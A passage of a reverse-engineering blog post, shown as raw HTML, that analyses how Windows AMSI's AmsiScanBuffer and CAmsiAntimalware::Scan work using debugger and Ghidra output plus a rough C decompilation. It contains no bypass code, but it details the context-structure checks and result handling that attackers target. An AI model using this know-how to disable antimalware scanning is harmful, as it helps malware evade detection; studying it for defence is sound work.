&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000002347f5d44d8  000002347e90cce0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;018&lt;/span&gt;&amp;gt; dq /c1 0x000002347f5d44e0 L1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;000002347f5d44e0  000002347eb5d120
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can refer to the memory map to get more information about what those QWORDs are.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now it is clear those two pointers are from heap segment 1. However, we still have no idea about the type of those pointers.&lt;/p&gt;
&lt;p&gt;However we already know those are pointers to objects thanks to our previous static analysis.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Above screenshot shows the virtual function table of &lt;code&gt;CAmsiBufferStream&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Then the next address where we can find some more information regarding &lt;strong&gt;amsiContext members&lt;/strong&gt; is,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ps1&#34; data-lang=&#34;ps1&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00007ff9455033d6 488b01           mov     rax, qword ptr [&lt;span style=&#34;color:#66d9ef&#34;&gt;rcx&lt;/span&gt;] ds&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;000002347eb5d120={amsi!ATL::CComObject&amp;lt;CAmsiAntimalware&amp;gt;::vftable&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt; (00007ff94550bb48)}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00007ff9455033d9 488b4018         mov     rax, qword ptr [rax+18h]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00007ff9455033dd ff15cd8d0000     call    qword ptr [amsi!_guard_dispatch_icall_fptr (00007ff9`4550c1b0)]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;in the above snippet, &lt;code&gt;rcx&lt;/code&gt; holds one of those pointers we just discussed, &lt;code&gt;000002347eb5d120&lt;/code&gt; (thirdMember). In the first instruction, 64 bit value at that address is loaded into &lt;code&gt;rax&lt;/code&gt;
register, which, according to the above snippet, is &lt;code&gt;00007ff94550bb48&lt;/code&gt;. It also specifies that this is a vtable located in .rodata section of the asmi.dll&amp;rsquo;s memory image.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;next two instructions retreives address &lt;strong&gt;0x18&lt;/strong&gt; offset from the vtable into &lt;code&gt;rax&lt;/code&gt; register and calls the address stored in &lt;code&gt;rax&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;This proves that our assumption on function pointer extracted from the &lt;code&gt;HAMSICONTEXT&lt;/code&gt; being a anti-malware vendor&amp;rsquo;s registered function is false and
it is a  pointer to &lt;code&gt;amsi!CAmsiAntimalware::Scan&lt;/code&gt; method.&lt;/p&gt;
&lt;p&gt;We have uncovered some important details about &lt;code&gt;HAMSICONETXT&lt;/code&gt; so far. We already know that the first member is a DWORD, and it should be
equal to &lt;strong&gt;0x49534d41&lt;/strong&gt; in order for scan to be successful.
Third member is a pointer to an object of class &lt;code&gt;CAmsiAntimalware&lt;/code&gt;, which has a virtual function called &lt;code&gt;amsi!CAmsiAntimalware::Scan&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;And by moving its 0x0 offset &lt;code&gt;rax&lt;/code&gt; register, we can access it&amp;rsquo;s virtual function table where we can find &lt;code&gt;Scan&lt;/code&gt; at the 0x18.&lt;/p&gt;
&lt;p&gt;The whole thing can be roughly decompiled down into below C code.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CAmsiAntimalware&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            [...]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;virtual&lt;/span&gt; Scan(CAmsiBufferStream &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;, AMSI_RESULT, DWORD);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            [...]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; HAMSICONTEXT {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        QWORD               unk1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        QWORD               &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;secondMember;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        CAmsiAntimalware    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;antimalware;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        [...]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    };
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HRESULT &lt;span style=&#34;color:#66d9ef&#34;&gt;__stdcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;AmsiScanBuffer&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            HAMSICONTEXT amsiContext, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            PVOID buffer, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ULONG length, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            LPCWSTR contentName, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            HAMSISESSION amsiSession, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            AMSI_RESULT &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;result
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt; var;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((WPP_GLOBAL_Control &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;WPP_GLOBAL_Control) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(WPP_GLOBAL_Control &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1c&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            WPP_SF_qqDqq(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)WPP_GLOBAL_Control &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;), 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                buffer, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                length, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                amsiContext, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                buffer, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                amsiSession, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                result
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                buffer &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                result &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                amsiContext &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)amsiContext) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x49534D41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)amsiContext &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)amsiContext&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80070057&lt;/span&gt;;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            CAmsiBufferStream bufferStream &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CAmsiBufferStream(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                buffer, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                length, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                amsiContext&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;secondMember,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                contentName,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                session
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ); 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; amsiContext&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;antimalware&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Scan(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                amsiContext&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;antimalware, &lt;span style=&#34;color:#75715e&#34;&gt;// this
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bufferStream, &lt;span style=&#34;color:#75715e&#34;&gt;// CAmsiBufferStream *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;                result,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We are not done yet. Goal here is to understand how AMSI works.
Therefore, our next target is amsi!CAmsiAntimalware::Scan.&lt;/p&gt;
&lt;p&gt;But before drill down into it, we need to construct the &lt;code&gt;HAMSICONTEXT&lt;/code&gt; structure out of the knowlegde we have.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_amsicontext_struct.png&#34; alt=&#34;&#34;&gt;
now we can see decompiler output is much more accurate and readable.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_scanbuffer_decompiler.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can also try constructing a &lt;code&gt;CAmsiAntimalware&lt;/code&gt; class but we dont have enough
information to populate member variables.&lt;/p&gt;
&lt;h2 id=&#34;camsiantimalwarescan&#34;&gt;CAmsiAntimalware::Scan&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_antimalware_scan_stack.png&#34; alt=&#34;stack&#34;&gt;&lt;/p&gt;
&lt;p&gt;So ghidra has created a nice view of the stack frame for us.
And by looking at the parameters, we see the function expects a pointer to an
&lt;code&gt;IAmsiBuffer&lt;/code&gt; object and a pointer to a pointer of &lt;code&gt;IAntimalwareProvider&lt;/code&gt; object.&lt;/p&gt;
&lt;p&gt;We saw that in the &lt;code&gt;AmsiScanBuffer&lt;/code&gt; that this value is set to zero.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_antimalware_scan_prologue.png&#34; alt=&#34;prologue&#34;&gt;&lt;/p&gt;
&lt;p&gt;Then continues to setup all those memory curruption
protection machanisms and to check the validity of the input parameters. First it checks if third parameter, &lt;code&gt;result&lt;/code&gt; is null (remember, result is a pointer to AMSI_RESULT enum).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_antimalware_result_valid.png&#34; alt=&#34;result valid&#34;&gt;&lt;/p&gt;
&lt;p&gt;if it is not, it jumps to label &lt;code&gt;result_valid&lt;/code&gt;. else, it sets &lt;code&gt;eax&lt;/code&gt; to &lt;code&gt;0x80070057&lt;/code&gt; and return. In the
&lt;code&gt;result_valid&lt;/code&gt; label, it sets &lt;code&gt;*result&lt;/code&gt; to &lt;code&gt;AMSI_RESULT_CLEAN&lt;/code&gt; (0x0). So it looks like the function is
clearing the &lt;code&gt;*result&lt;/code&gt; to not detected state. Which means we can expect value of
&lt;code&gt;result&lt;/code&gt; to change.&lt;/p&gt;
&lt;p&gt;It also checks if &lt;code&gt;provider&lt;/code&gt; is null. If not, it sets value of it to null and
continue execution from
&lt;code&gt;LAB_7ff94550565c&lt;/code&gt;. else, it continues the execution from the same location but
without setting &lt;code&gt;*provider&lt;/code&gt; to null.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_antimalware_lab_565c.png&#34; alt=&#34;LAB_7ff94550565c&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;LAB_7ff94550565c&lt;/code&gt; does the same thing as &lt;code&gt;AmsiScanBuffer&lt;/code&gt; did at the block
&lt;code&gt;0x7ffxxxxx335d&lt;/code&gt;. However instead of calling &lt;code&gt;WPP_SF_qqDqq&lt;/code&gt; it calls &lt;code&gt;WPP_SF_q&lt;/code&gt;.
Also note that above snippet sets &lt;code&gt;rdx&lt;/code&gt; to either address of &lt;code&gt;[WPP_GLOBAL_CONTROL]&lt;/code&gt;
or &lt;code&gt;0x1e&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;LAB_7ff94550568d&lt;/code&gt; looks interesting.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_antimalware_lab_568d.png&#34; alt=&#34;LAB_7ff94550568d&#34;&gt;&lt;/p&gt;
&lt;p&gt;First it calls &lt;code&gt;rand()&lt;/code&gt; function. In case you dont know, it&amp;rsquo;s pretty common C
library function and it generates a psuedo random
number and return it. In the next line, it stores a member of &lt;code&gt;CAmsiAntimalware&lt;/code&gt;
class at offset &lt;code&gt;0x1c0&lt;/code&gt; in &lt;code&gt;r13&lt;/code&gt; register.
Then there are some multipications around the generated value value.&lt;/p&gt;
&lt;p&gt;ghidra being ghidra, has renamed registers with the variable names (this is good if
we are doing x86 reversing becuase most of calling conventions pass parameters
through stack, However, in our case, since parameters are passed through registers,
renaming those can cause confusion), So to make it clear, we&amp;rsquo;ll use listing view.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_antimalware_lab_568d_listing.png&#34; alt=&#34;LAB_7ff94550568d&#34;&gt;&lt;/p&gt;
&lt;p&gt;It assigns the return value from &lt;code&gt;rand()&lt;/code&gt; to &lt;code&gt;ecx&lt;/code&gt; register and loads &lt;code&gt;eax&lt;/code&gt; with
&lt;strong&gt;0x51eb851f&lt;/strong&gt;. then it multiplies random value stored in &lt;code&gt;ecx&lt;/code&gt; with the value
loaded in &lt;code&gt;eax&lt;/code&gt;. Note that this instruction is capable of changing the value at &lt;code&gt;edx&lt;/code&gt; register.&lt;/p&gt;
&lt;p&gt;Then there&amp;rsquo;s a shift right instruction, which shifts 5 bits from &lt;code&gt;edx&lt;/code&gt; register.
then it multiplies shifted &lt;code&gt;edx&lt;/code&gt; with 0x64 and stores the value in &lt;code&gt;eax&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;sub instruction substracts &lt;code&gt;eax&lt;/code&gt;, by &lt;code&gt;ecx&lt;/code&gt;. what this whole thing does is similar to below expression&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ps1&#34; data-lang=&#34;ps1&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rand() % 0x64;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;value of &lt;code&gt;ecx&lt;/code&gt; is then stored in a local variable &lt;code&gt;loc_rand&lt;/code&gt; and function checks if &lt;code&gt;r13&lt;/code&gt;, which holds the value of &lt;code&gt;this-&amp;gt;0x1c0&lt;/code&gt; is 0/null. If yes, it jumps to &lt;code&gt;LAB_7ff9455058c4&lt;/code&gt;. else, it continues exection from next address.&lt;/p&gt;
&lt;p&gt;Now we got two control paths to follow. but first, I&amp;rsquo;m not gonna take the jump.&lt;/p&gt;
&lt;h4 id=&#34;control-flow-path-1&#34;&gt;Control flow path 1&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_antimalware_0x7ff9455056bb.png&#34; alt=&#34;0x7ffxxxx56bb&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0x7ffxxxxx56bb&lt;/code&gt;, address of &lt;code&gt;this-&amp;gt;0x40&lt;/code&gt; gets loaded into &lt;code&gt;r14&lt;/code&gt;, which then gets stored in a local variable. Next instruction loads &lt;code&gt;this-&amp;gt;0xc0&lt;/code&gt; into &lt;code&gt;r12&lt;/code&gt; register.&lt;/p&gt;
&lt;p&gt;Then there&amp;rsquo;s an unconditional jump and this one jumps directly into a loop. so Im gonna save that part for a debugging session and continue with the other control flow path.&lt;/p&gt;
&lt;h4 id=&#34;control-flow-path-2&#34;&gt;Control flow path 2&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_antimalware_lab_58c4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;LAB_7ff9455058c4&lt;/code&gt; starts with a comparison of &lt;code&gt;r13&lt;/code&gt;(this-&amp;gt;0x1c0 but as a local variable) with
&lt;code&gt;this-&amp;gt;0x1c0&lt;/code&gt;. The comparison checks if &lt;code&gt;r13&lt;/code&gt; is less than &lt;code&gt;this-&amp;gt;0x1c0&lt;/code&gt;. if it is, control flow is
directed to address &lt;code&gt;0x7ffxxxxx58cd&lt;/code&gt;.
else, control flow is directed to label &lt;code&gt;LAB_7ff9455058f7&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;First instruction at &lt;code&gt;0x7ffxxxxx58cd&lt;/code&gt; sets &lt;code&gt;r14&lt;/code&gt; to zero (rbx is xored by itself at the begining of the
function). Next two instructions checks if &lt;code&gt;r12&lt;/code&gt; is null.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_antimalware_58d5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;if not, value at address &lt;code&gt;r12&lt;/code&gt; is set to &lt;code&gt;[RSI + r13*0x8 + 0x40]&lt;/code&gt;. Then it checks if &lt;code&gt;rcx&lt;/code&gt; is null. If we
assume the jump to &lt;code&gt;LAB_7ff9455058c4&lt;/code&gt; taken from &lt;code&gt;0x7ffxxxxx56b5&lt;/code&gt;, then &lt;code&gt;rcx&lt;/code&gt; would be the remainder of
&lt;code&gt;rand() % 0x64&lt;/code&gt; thing. if &lt;code&gt;rcx&lt;/code&gt; is null, jump is taken to label &lt;code&gt;LAB_7ff9455058fd&lt;/code&gt;. else, it loads value at
&lt;code&gt;(*(rcx) + 0x8)&lt;/code&gt; to &lt;code&gt;rax&lt;/code&gt; and calls it through &lt;code&gt;_guard_dispatch_icall&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;if &lt;code&gt;r12&lt;/code&gt; is null, jump is also taken to label &lt;code&gt;LAB_7ff9455058fd&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/CSharpLoader/ghidra_antimalware_lab_58f7.png&#34; alt=&#34;LAB_7ff9455058f7&#34;&gt;
on the other hand, &lt;code&gt;LAB_7ff9455058f7&lt;/code&gt; also jumps to &lt;code&gt;LAB_7ff9455058fd&lt;/code&gt; after moving 0x1 into &lt;code&gt;[rdi]&lt;/code&gt;. We
already know that &lt;code&gt;rdi&lt;/code&gt; is
pointing to &lt;code&gt;AMSI_RESULT&lt;/code&gt; enum. Constant 1 means &lt;code&gt;AMSI_RESULT_NOT_DETECTED&lt;/code&gt;.&lt;/p&gt;
